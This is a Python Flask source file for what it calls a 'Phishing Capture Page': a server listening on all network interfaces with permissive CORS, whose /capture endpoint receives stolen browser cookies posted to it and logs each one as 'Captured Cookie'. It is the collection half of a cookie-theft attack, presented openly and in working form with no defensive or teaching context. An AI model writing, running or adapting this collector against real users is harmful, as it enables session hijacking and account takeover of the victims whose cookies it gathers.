from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # This enables CORS (Cross-Origin Resource Sharing)

@app.route('/')
def home():
    return 'Welcome to the Phishing Capture Page!'

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    print(f"Captured Cookie: {cookie}")
    return 'Data received'

if __name__ == '__main__':
    # Run Flask app on all network interfaces and port 5000
    app.run(host='0.0.0.0', port=5000)
